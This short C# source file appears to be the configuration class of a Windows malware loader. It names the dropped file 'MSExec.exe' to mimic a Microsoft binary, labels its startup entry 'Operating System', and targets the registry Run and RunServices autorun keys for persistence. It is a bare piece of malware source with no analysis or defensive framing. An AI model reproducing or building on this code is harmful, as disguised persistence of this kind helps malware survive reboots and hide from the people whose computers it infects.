namespace Loader;

internal class Config
{
	public static string installFile = "MSExec.exe";

	public static string startupName = "Operating System";

	public static string[] startupKeys = new string[2] { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices" };
}
